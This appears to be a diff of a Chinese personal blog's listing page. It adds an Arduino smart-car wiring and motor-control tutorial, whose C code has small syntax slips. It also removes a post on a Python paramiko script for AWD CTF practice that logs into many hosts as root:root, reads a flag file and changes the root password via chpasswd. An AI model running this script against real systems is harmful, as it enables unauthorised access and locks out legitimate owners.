@@ -207,6 +207,233 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d7d58228d.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d7d58228d.html" class="post-title-link" itemprop="url">初学Adruino开发板笔记-智能小车（一）</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-10-26 17:48:20" itemprop="dateCreated datePublished" datetime="2019-10-26T17:48:20+08:00">2019-10-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:17:59" itemprop="dateModified" datetime="2020-10-14T17:17:59+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/开发板/" itemprop="url" rel="index"><span itemprop="name">开发板</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.9k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="材料准备"><a href="#材料准备" class="headerlink" title="材料准备"></a>材料准备</h1><ul>
+<li>电机驱动模块</li>
+<li>Adruino uno开发板</li>
+<li>杜邦线若干</li>
+<li>小车总成</li>
+</ul>
+<h1 id="小车线路连接"><a href="#小车线路连接" class="headerlink" title="小车线路连接"></a>小车线路连接</h1><h4 id="驱动模块"><a href="#驱动模块" class="headerlink" title="驱动模块"></a>驱动模块</h4><p>​        首先了解<code>电机驱动模块</code>的组成，电机驱动模块的四个接口分别连接连接电机的正负极，也就是电机1的正负极分别连接out1、out2.同理另外一个电机接到out3、out4。这样就可以通过输出高低电平来控制小车的移动。而VCC（正极）接口用于外界电源的供电，接到板子的VIN接口（ 供电范围7~12V ）不过最好低于10V，个人不大推荐外接电源，使用USB+充电宝供电即可。中间的GND是地线接口，接到板子的GND接口，第三个5V接口就是通过板子的5V接口给驱动模块供电，但是板子得用充电宝供电。IN1-IN4接口接到板子上对应的输出引脚，需要根据你的代码实际情况进行接入。</p>
+<hr>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191026/15720840884637.png" alt="img"></p>
+<h4 id="开发板"><a href="#开发板" class="headerlink" title="开发板"></a>开发板</h4><p>整体连接如下：</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191026/15720862822325.png" alt="img"></p>
+<ul>
+<li><p><strong>Power 引脚:</strong> 均是供电所用，提供3.3V、5V、GND（地线）、VIN（外接电源）而</p>
+</li>
+<li><p><strong>Analog In引脚</strong> :右下方的A0~A5为模拟输入引脚， 开发板可读取外部模拟信号. </p>
+</li>
+<li><p><strong>13引脚</strong> :连接板载LED灯，可通过控制13引脚来控制LED灯亮灭。一般拿到开发板上电板载灯都会闪烁，可辅助检测开发板是否正常 </p>
+</li>
+<li><p><strong>Digital 引脚</strong> : UNO R3拥有14个数字I/O引脚，其中6个可用于PWM(脉宽调制)输出 ,也就是带波浪线（~）的引脚。PWM引脚可以用于调节电机转速。 数字引脚用于读取逻辑值(0或1)，或者作为数字输出引脚来驱动外部模块。 </p>
+<p>​        了解了这些引脚的功能后那么我们就可以将控制我们电机的接口连接到PWM接口上，这样就能够控制我们的电机转速，也能调整电机的转动方向</p>
+</li>
+<li><p><strong>Adruino uno引脚一览图：</strong></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191026/15720864094604.png" alt="img"></p>
+</li>
+</ul>
+<hr>
+<h4 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h4><ul>
+<li><p><strong>实现简单的方向控制</strong></p>
+<p>首先我们小车要实现前进，那么就需要四个轮子转动方向一致，那么我们通过电机的电流要一致，那么我们控制轮子可以通过引脚输出高低电平的方式实现。前进的代码如下,<code>analogWrite(引脚,PWM值)</code>用于调节电机转速，digitalWrite（引脚，高电平/低电平），如果两边轮子设置为HIGH and LOW那么他们的电流方向一致，所以会前进，后退自然就是反过来，转向就是让两边轮子转的方向相反(与坦克转向原理类似)。</p>
+<pre><code class="C">analogWrite(PIN_PWML,200);
+digitalWrite(PIN_AIN3,HIGH);
+digitalWrite(PIN_AIN4,LOW);
+analogWrite(PIN_PWMR,200);
+digitalWrite(PIN_AIN1,HIGH);
+digitalWrite(PIN_AIN2,LOW)</code></pre>
+</li>
+<li><p>简单源码DEMO，具体在注释中已经十分详细，这里不再做讲解。</p>
+<pre><code class="c">#define PIN_PWML 9
+#define PIN_AIN3 5//对应板子上INPUT3
+#define PIN_AIN4 6//对应板子上INPUT4
+#define PIN_PWMR 10
+#define PIN_AIN1 9//对应板子上INPUT1
+#define PIN_AIN2 10//对应板子上INPUT2
+void setup() {//初始化，将引脚设置为输出状态
+  pinMode(PIN_PWML,OUTPUT);
+  pinMode(PIN_AIN3,OUTPUT);
+  pinMode(PIN_AIN4,OUTPUT);
+  pinMode(PIN_PWMR,OUTPUT);
+  pinMode(PIN_AIN1,OUTPUT);
+  pinMode(PIN_AIN2,OUTPUT);
+
+}
+void loop() {//主循环
+    analogWrite(PIN_PWML,200);
+    digitalWrite(PIN_AIN3,HIGH);
+    digitalWrite(PIN_AIN4,LOW);
+    analogWrite(PIN_PWMR,200);
+    digitalWrite(PIN_AIN1,HIGH);
+    digitalWrite(PIN_AIN2,LOW)
+    delay(3000); //动作保持3秒以上
+
+</code></pre>
+</li>
+</ul>
+<p>  }</p>
+<pre><code>
+- 多个动作实现DEMO
+
+  ```c
+  #define PIN_PWML 9
+  #define PIN_AIN3 5
+  #define PIN_AIN4 6//定义引脚接口，具体看上面的接口讲解
+  #define PIN_PWMR 10
+  #define PIN_AIN1 9
+  #define PIN_AIN2 10/
+  void carrun(int num){
+    switch(num){
+      case 0://前进
+          analogWrite(PIN_PWML,200);
+          digitalWrite(PIN_AIN3,LOW);
+          digitalWrite(PIN_AIN4,HIGH);
+          analogWrite(PIN_PWMR,200);
+          digitalWrite(PIN_AIN1,LOW);
+          digitalWrite(PIN_AIN2,HIGH);
+      break;
+      case 1://后退
+            analogWrite(PIN_PWML,200);
+            digitalWrite(PIN_AIN3,HIGH);
+            digitalWrite(PIN_AIN4,LOW);
+            analogWrite(PIN_PWMR,200);
+            digitalWrite(PIN_AIN1,HIGH);
+            digitalWrite(PIN_AIN2,LOW);
+      break;
+      case 2://左转弯
+            analogWrite(PIN_PWML,200);
+            digitalWrite(PIN_AIN3,HIGH);
+            digitalWrite(PIN_AIN4,LOW);
+            analogWrite(PIN_PWMR,200);
+            digitalWrite(PIN_AIN1,LOW);
+            digitalWrite(PIN_AIN2,HIGH);
+      break;
+      case 3://右转弯
+            analogWrite(PIN_PWML,200);
+            digitalWrite(PIN_AIN3,LOW);
+            digitalWrite(PIN_AIN4,HIGH);
+            analogWrite(PIN_PWMR,200);
+            digitalWrite(PIN_AIN1,HIGH);
+            digitalWrite(PIN_AIN2,LOW);
+      break;
+      default://停止
+            analogWrite(PIN_PWML,200);
+            digitalWrite(PIN_AIN3,LOW);
+            digitalWrite(PIN_AIN4,LOW);
+            analogWrite(PIN_PWMR,200);
+            digitalWrite(PIN_AIN1,LOW);
+            digitalWrite(PIN_AIN2,LOW);
+      break;
+    }
+  }
+  void setup() {
+    pinMode(PIN_PWML,OUTPUT);
+    pinMode(PIN_AIN3,OUTPUT);
+    pinMode(PIN_AIN4,OUTPUT);
+    pinMode(PIN_PWMR,OUTPUT);
+    pinMode(PIN_AIN1,OUTPUT);
+    pinMode(PIN_AIN2,OUTPUT);
+
+  }
+
+  void loop() {
+    int i;
+    for(i=0;i&lt;5;i++){
+      carrun(i);
+       delay(3000); 
+    }
+
+
+  }
+</code></pre><h4 id="最后烤入开发板即可"><a href="#最后烤入开发板即可" class="headerlink" title="最后烤入开发板即可"></a>最后烤入开发板即可</h4><p><img src="http://goodcheerleung.gitee.io/mycute/20191026/15720878134660.png" alt="img"></p>
+<h4 id="测试效果"><a href="#测试效果" class="headerlink" title="测试效果"></a>测试效果</h4><p>​        看我朋友圈</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d8297e9d3b.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2689,227 +2916,10 @@ cat /etc/passwd
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d72df663a9.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d72df663a9.html" class="post-title-link" itemprop="url">SSH爆破脚本编写小记\Python paramiko库的学习</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-09-21 13:33:29" itemprop="dateCreated datePublished" datetime="2019-09-21T13:33:29+08:00">2019-09-21</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:49:33" itemprop="dateModified" datetime="2020-10-14T17:49:33+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/学习笔记/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>3.1k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在紧张备战AWD线下赛，没什么经验，防止有全场密码一样的情况，直接写脚本cat全场flag，然后修改系统密码。</p>
-<h2 id="编写记录"><a href="#编写记录" class="headerlink" title="编写记录"></a>编写记录</h2><h4 id="paramiko的安装"><a href="#paramiko的安装" class="headerlink" title="paramiko的安装"></a>paramiko的安装</h4><pre><code class="shell">pip install parmiko</code></pre>
-<h4 id="简单的ssh连接例子"><a href="#简单的ssh连接例子" class="headerlink" title="简单的ssh连接例子"></a>简单的ssh连接例子</h4><pre><code class="python">import paramiko
-import sys
-def SshCon(ip,prot,user,passwd):
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    try:
-        ssh.connect(ip,prot,user,passwd,timeout=1.5)
-        stdin, stdout, stderr = ssh.exec_command(&#39;df&#39;)
-        result=stdout.read()
-        if(result):
-            print(&quot;Success&quot;)
-    except Exception as e:
-        pass
-SshCon(&#39;127.0.0.1&#39;,22,&#39;root&#39;,&#39;root&#39;)
-</code></pre>
-<ul>
-<li><p>从例子中不难看出，在执行一条shell后悔返回shell的执行结果，这个结果是字节类型，所以对返回结果处理时候可以转换为字符串类型。</p>
-</li>
-<li><p>修改密码只需执行一条命令</p>
-</li>
-</ul>
-<pre><code class="python">stdin, stdout, stderr = ssh.exec_command(&quot;echo &#39;root:admin123&#39;|chpasswd&quot;)</code></pre>
-<h4 id="多线程对多个IP进行爆破demo"><a href="#多线程对多个IP进行爆破demo" class="headerlink" title="多线程对多个IP进行爆破demo"></a>多线程对多个IP进行爆破demo</h4><pre><code class="python">import threading
-try:
-    import queue
-except:
-    from Queue import Queue
-class Ssh(threading.Thread):
-    def __init__(self,queue):
-        threading.Thread.__init__(self)
-        self._queue=queue
-    def run(self):
-        while not self._queue.empty():
-            try:
-                iplist=self._queue.get()
-                self.SshCon(iplist)
-    def SshCon(self,ip):
-        &#39;&#39;&#39;略&#39;&#39;&#39;
-def main():
-    try:
-        Myqueue = Queue()
-    except:
-        Myqueue = queue.Queue()
-    with open(&quot;ssh.txt&quot;) as dic:
-        for i in dic:
-            Myqueue.put(i.strip(&#39;\n&#39;))
-    threads = []
-    threadsCount=50
-    for i in range(threadsCount):
-        threads.append(Ssh(Myqueue))
-    for t in threads:
-        t.start()
-    for t in threads:
-        t.join()       </code></pre>
-<h4 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h4><pre><code class="python">#!/usr/bin/env python
-#-*-coding:utf-8-*-
-import paramiko
-import sys
-import threading
-import os
-import time
-try:
-    import queue
-except:
-    from Queue import Queue
-class SshSimplepass(threading.Thread):
-    def __init__(self,queue):
-        threading.Thread.__init__(self)
-        self._queue=queue
-    def run(self):
-        while not self._queue.empty():
-            try:
-                iPlist=self._queue.get()
-                self.SshCheck(iPlist)
-            except:
-                pass
-    def SshCheck(self,ip):
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # 跳过了远程连接中选择‘是’的环节,
-        try:
-            ssh.connect(ip, 22, &#39;root&#39;, &#39;root&#39;,timeout=1.5)
-            stdin, stdout, stderr = ssh.exec_command(&#39;df&#39;)
-            result=stdout.read()
-            if not result is None:
-                stdin, stdout, stderr = ssh.exec_command(&#39;cat /flag&#39;)
-                result = str(stdout.read(),encoding=&quot;utf-8&quot;)
-                sys.stdout.write(&#39;\033[5;32m&#39;+&#39;[+]&#39;+&#39;\t&#39;+ip+&#39;\t&#39;+result+&#39;\n&#39;)
-                with open(filename) as file:
-                    if ip not in file.read():
-                        f = open(filename,&#39;a+&#39;)
-                        f.write(ip+&#39;\t&#39;+result)
-                        f.close()
-            stdin, stdout, stderr = ssh.exec_command(&quot;echo &#39;root:admin123&#39;|chpasswd&quot;)
-            print(stdout.read())    
-        except Exception as e:
-            pass
-            #sys.stdout.write(&#39;\033[31m&#39;+&quot;[NOT]&quot;+&#39;\t&#39;+ip+&quot;\n&quot;)    
-        finally:
-            ssh.close()
-def main(threadsCounts):
-    try:
-        Myqueue = Queue()
-    except:
-        Myqueue = queue.Queue()
-
-    with open(&quot;ssh.txt&quot;) as dic:
-        for line in dic:
-            Myqueue.put(line.strip(&#39;\n&#39;))
-    threads=[]
-    threadsCount=int(threadsCounts)
-    for i in range(threadsCount):
-        threads.append(SshSimplepass(Myqueue))
-    for t in threads:
-        t.start()
-    for t in threads:
-        t.join()
-if __name__==&#39;__main__&#39;:
-    if len(sys.argv) != 2:
-        sys.stdout.write(&quot;Enter:python %s threads&quot; %(sys.argv[0]))
-    else:
-        path=&quot;result/&quot;
-        filename=path+&#39;/&#39;+str(time.strftime(&quot;%Y-%m-%d&quot;, time.localtime()))+&quot;.txt&quot;
-        isExists=os.path.exists(path)
-        if not isExists:
-            os.makedirs(path)
-        f = open(filename,&quot;a+&quot;)
-        f.close()
-        main(sys.argv[1])</code></pre>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -2977,7 +2987,7 @@ if __name__==&#39;__main__&#39;:
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">70</span>
+          <span class="site-state-item-count">71</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -3048,12 +3058,12 @@ if __name__==&#39;__main__&#39;:
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">259k</span>
+    <span title="站点总字数">263k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:56</span>
+    <span title="站点阅读时长">3:59</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
